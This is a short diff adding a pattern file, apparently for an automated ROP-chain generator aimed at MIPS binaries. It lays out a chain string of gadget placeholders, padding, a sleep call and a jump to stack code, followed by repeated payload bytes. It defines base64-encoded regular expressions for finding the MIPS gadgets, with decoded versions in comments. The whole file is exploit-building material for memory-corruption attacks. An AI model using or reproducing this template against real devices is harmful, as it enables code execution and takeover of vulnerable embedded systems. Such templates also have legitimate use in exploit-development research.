@@ -1,0 +1,11 @@
+#pattern1 for rop chain generation
+
+chainString: (gadget2)(gadget1)BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB(sleep)CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC(call_code)DDDD(stack_gadget)\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44
+gadget1: KC4qKW1vdmUgXCR0OVwsIFwkczE7IGx3IFwkcmFcLCAweDI0XChcJHNwXCk7IGx3IFwkczFcLCAweDIwXChcJHNwXCk7IGx3IFwkczBcLCAweDFjXChcJHNwXCk7KC4qKTsganIgXCR0OTsgYWRkaXUgXCRzcFwsIFwkc3BcLCAweDI4Ow==
+#gadget1: (.*)move \\$t9\\, \\$s1; lw \\$ra\\, 0x24\\(\\$sp\\); lw \\$s1\\, 0x20\\(\\$sp\\); lw \\$s0\\, 0x1c\\(\\$sp\\);(.*); jr \\$t9; addiu \\$sp\\, \\$sp\\, 0x28; 
+gadget2: KC4qKWFkZGl1IFwkYTBcLCBcJHplcm9cLCAxOyBtb3ZlIFwkdDlcLCBcJHMxOyBqYWxyIFwkdDk7
+#gadget2: (.*)addiu \\$a0\\, \\$zero\\, 1; move \\$t9\\, \\$s1; jalr \\$t9;
+call_code: KC4qKW1vdmUgXCR0OVwsIFwkczI7IGphbHIgXCR0OTs=
+#call_code: (.*)move \\$t9\\, \\$s2; jalr \\$t9;
+stack_gadget: KC4qKWFkZGl1IFwkczJcLCBcJHNwXCwgMHgxODsoLiopbW92ZSBcJHQ5XCwgXCRzMDsgamFsciBcJHQ5Ow==
+#stack_gadget: (.*)addiu \\$s2\\, \\$sp\\, 0x18;(.*)move \\$t9\\, \\$s0; jalr \\$t9;
